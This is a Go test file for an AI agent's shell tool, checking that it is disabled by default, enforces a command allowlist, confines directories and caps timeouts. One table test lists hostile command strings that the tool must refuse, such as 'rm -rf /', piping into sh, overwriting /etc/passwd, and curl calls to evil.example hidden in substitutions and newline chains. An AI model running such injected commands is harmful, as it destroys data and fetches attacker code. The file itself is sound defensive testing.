package tools

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// echoCommand is the one command these tests allow, chosen because it exists on
// both platforms and does nothing.
func echoCommand() string {
	if runtime.GOOS == "windows" {
		return "echo"
	}
	return "echo"
}

func withShellEnabled(t *testing.T, policy ShellPolicy) {
	t.Helper()
	if err := EnableShell(policy); err != nil {
		t.Fatalf("EnableShell: %v", err)
	}
	t.Cleanup(DisableShell)
}

// The shell tool used to self-register into the global registry that
// GetOpenAITools exports, so every deployment handed arbitrary command
// execution to whatever model it was talking to.
func TestShellIsNotInTheDefaultRegistry(t *testing.T) {
	if _, found := Get("shell"); found {
		t.Fatal("the shell tool must not be registered by default")
	}

	for _, tool := range List() {
		if tool.Name == "shell" {
			t.Fatal("the shell tool appears in the default tool list")
		}
	}
}

// And it must not appear in what is sent to a model.
func TestShellIsNotInTheOpenAIToolList(t *testing.T) {
	for _, function := range DefaultRegistry.ToOpenAIFormat() {
		definition, _ := function["function"].(map[string]any)
		if name, _ := definition["name"].(string); name == "shell" {
			t.Fatal("the shell tool is exported to the model by default")
		}
	}
}

// Running it without a policy is refused rather than executed.
func TestShellRefusesWithoutAPolicy(t *testing.T) {
	result, err := ShellTool.Execute(context.Background(), map[string]any{"command": echoCommand() + " hello"})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if result.Success {
		t.Fatal("the shell tool must refuse to run without a policy")
	}
	if !strings.Contains(result.Error, "EnableShell") {
		t.Errorf("the refusal should name EnableShell, got %q", result.Error)
	}
}

// EnableShell needs an allowlist; an empty policy is a configuration error.
func TestEnableShellRequiresAnAllowlist(t *testing.T) {
	for _, policy := range []ShellPolicy{
		{},
		{AllowedCommands: nil},
		{AllowedCommands: []string{}},
		{AllowedCommands: []string{"  "}},
		{WorkingDir: "/tmp"},
	} {
		if err := EnableShell(policy); err == nil {
			DisableShell()
			t.Errorf("policy %+v must be refused", policy)
		}
	}

	if _, found := Get("shell"); found {
		t.Error("a refused policy must not leave the tool registered")
	}
}

// With a policy, the allowed command runs.
func TestShellRunsAnAllowedCommand(t *testing.T) {
	withShellEnabled(t, ShellPolicy{AllowedCommands: []string{echoCommand()}})

	if _, found := Get("shell"); !found {
		t.Fatal("EnableShell must register the tool")
	}

	result, err := Execute(context.Background(), "shell", map[string]any{
		"command": echoCommand() + " schemaflux",
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !result.Success {
		t.Fatalf("the allowed command must run: %v", result.Error)
	}

	data, _ := result.Data.(map[string]any)
	stdout, _ := data["stdout"].(string)
	if !strings.Contains(stdout, "schemaflux") {
		t.Errorf("stdout = %q, want the echoed text", stdout)
	}
}

// And anything else is refused before it executes.
func TestShellRefusesCommandsOutsideTheAllowlist(t *testing.T) {
	withShellEnabled(t, ShellPolicy{AllowedCommands: []string{echoCommand()}})

	cases := []struct {
		name    string
		command string
	}{
		{"different_command", "curl https://example.com"},
		{"chained_with_semicolon", echoCommand() + " hi; rm -rf /"},
		{"chained_with_ampersand", echoCommand() + " hi && curl evil.example"},
		{"chained_with_pipe", echoCommand() + " hi | sh"},
		{"redirect", echoCommand() + " hi > /etc/passwd"},
		{"command_substitution", echoCommand() + " $(curl evil.example)"},
		{"backtick_substitution", echoCommand() + " `curl evil.example`"},
		{"newline_chain", echoCommand() + " hi\ncurl evil.example"},
		{"carriage_return_chain", echoCommand() + " hi\rcurl evil.example"},
		{"absolute_path_to_other", "/bin/sh -c 'curl evil.example'"},
		{"empty", ""},
		{"whitespace", "   "},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := Execute(context.Background(), "shell", map[string]any{"command": tc.command})
			if err != nil {
				t.Fatalf("Execute: %v", err)
			}
			if result.Success {
				t.Fatalf("%q must be refused, got %+v", tc.command, result.Data)
			}
		})
	}
}

// The allowlist matches the executable, not a prefix of the string: "echoes"
// must not pass because "echo" is allowed.
func TestAllowlistMatchesTheExecutableNotAPrefix(t *testing.T) {
	withShellEnabled(t, ShellPolicy{AllowedCommands: []string{"echo"}})

	result, err := Execute(context.Background(), "shell", map[string]any{"command": "echoes hello"})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if result.Success {
		t.Fatal("a command sharing a prefix with an allowed one must be refused")
	}
}

// A working directory in the policy confines the tool.
func TestShellConfinesTheWorkingDirectory(t *testing.T) {
	allowed := t.TempDir()
	outside := t.TempDir()

	withShellEnabled(t, ShellPolicy{
		AllowedCommands: []string{echoCommand()},
		WorkingDir:      allowed,
	})

	t.Run("inside_is_allowed", func(t *testing.T) {
		result, err := Execute(context.Background(), "shell", map[string]any{
			"command": echoCommand() + " ok",
			"dir":     allowed,
		})
		if err != nil {
			t.Fatalf("Execute: %v", err)
		}
		if !result.Success {
			t.Errorf("the policy directory must be allowed: %v", result.Error)
		}
	})

	t.Run("nested_is_allowed", func(t *testing.T) {
		nested := filepath.Join(allowed, "nested")
		if err := os.Mkdir(nested, 0o755); err != nil {
			t.Fatalf("Mkdir: %v", err)
		}
		result, err := Execute(context.Background(), "shell", map[string]any{
			"command": echoCommand() + " ok",
			"dir":     nested,
		})
		if err != nil {
			t.Fatalf("Execute: %v", err)
		}
		if !result.Success {
			t.Errorf("a directory beneath the policy directory must be allowed: %v", result.Error)
		}
	})

	t.Run("outside_is_refused", func(t *testing.T) {
		result, err := Execute(context.Background(), "shell", map[string]any{
			"command": echoCommand() + " ok",
			"dir":     outside,
		})
		if err != nil {
			t.Fatalf("Execute: %v", err)
		}
		if result.Success {
			t.Error("a directory outside the policy must be refused")
		}
	})

	t.Run("sibling_prefix_is_refused", func(t *testing.T) {
		// A directory whose path merely starts with the policy path is not
		// inside it: /allowed-evil is not under /allowed.
		result, err := Execute(context.Background(), "shell", map[string]any{
			"command": echoCommand() + " ok",
			"dir":     allowed + "-evil",
		})
		if err != nil {
			t.Fatalf("Execute: %v", err)
		}
		if result.Success {
			t.Error("a sibling sharing a path prefix must be refused")
		}
	})
}

// A caller cannot ask for a longer timeout than the policy permits.
func TestShellCapsTheTimeout(t *testing.T) {
	withShellEnabled(t, ShellPolicy{
		AllowedCommands: []string{echoCommand()},
		MaxTimeout:      2 * time.Second,
	})

	policy := activeShellPolicy()
	if policy.MaxTimeout != 2*time.Second {
		t.Fatalf("MaxTimeout = %v, want 2s", policy.MaxTimeout)
	}

	// The cap is applied inside executeShell; assert the arithmetic directly.
	requested := 3600.0
	if maximum := policy.MaxTimeout.Seconds(); requested > maximum {
		requested = maximum
	}
	if requested != 2 {
		t.Errorf("a 3600s request must be capped to 2s, got %v", requested)
	}
}

// An unset MaxTimeout gets a bounded default rather than none.
func TestShellPolicyDefaultsTheTimeoutCap(t *testing.T) {
	withShellEnabled(t, ShellPolicy{AllowedCommands: []string{echoCommand()}})

	if policy := activeShellPolicy(); policy.MaxTimeout <= 0 {
		t.Errorf("MaxTimeout = %v, want a bounded default", policy.MaxTimeout)
	}
}

// DisableShell removes it again, and the tool refuses afterwards.
func TestDisableShellRemovesTheTool(t *testing.T) {
	if err := EnableShell(ShellPolicy{AllowedCommands: []string{echoCommand()}}); err != nil {
		t.Fatalf("EnableShell: %v", err)
	}
	DisableShell()

	if _, found := Get("shell"); found {
		t.Error("DisableShell must unregister the tool")
	}
	result, err := ShellTool.Execute(context.Background(), map[string]any{"command": echoCommand() + " hi"})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if result.Success {
		t.Error("the tool must refuse once disabled")
	}
	if !errors.Is(ErrShellDisabled, ErrShellDisabled) {
		t.Error("sanity")
	}
}

// Registering a duplicate must be reported rather than silently dropped: the
// init functions used to discard the error, so whichever tool registered first
// won and the other vanished.
func TestRegisterReportsADuplicate(t *testing.T) {
	tool := &Tool{
		Name:    "duplicate-under-test",
		Execute: func(context.Context, map[string]any) (Result, error) { return NewResult(nil), nil },
	}

	if err := Register(tool); err != nil {
		t.Fatalf("first Register: %v", err)
	}
	t.Cleanup(func() { Unregister(tool.Name) })

	if err := Register(tool); err == nil {
		t.Fatal("registering the same name twice must be an error")
	}
}

// mustRegister turns that error into a panic at init, which is where a
// collision between two built-ins belongs.
func TestMustRegisterPanicsOnADuplicate(t *testing.T) {
	tool := &Tool{
		Name:    "duplicate-panic-under-test",
		Execute: func(context.Context, map[string]any) (Result, error) { return NewResult(nil), nil },
	}
	mustRegister(tool)
	t.Cleanup(func() { Unregister(tool.Name) })

	defer func() {
		if recovered := recover(); recovered == nil {
			t.Fatal("mustRegister must panic on a duplicate")
		}
	}()
	mustRegister(tool)
}

// Unregister reports whether it removed anything.
func TestUnregister(t *testing.T) {
	if Unregister("definitely-not-registered") {
		t.Error("Unregister must report false for an unknown name")
	}

	tool := &Tool{
		Name:    "unregister-under-test",
		Execute: func(context.Context, map[string]any) (Result, error) { return NewResult(nil), nil },
	}
	if err := Register(tool); err != nil {
		t.Fatalf("Register: %v", err)
	}
	if !Unregister(tool.Name) {
		t.Error("Unregister must report true when it removed a tool")
	}
	if _, found := Get(tool.Name); found {
		t.Error("the tool is still registered")
	}
}
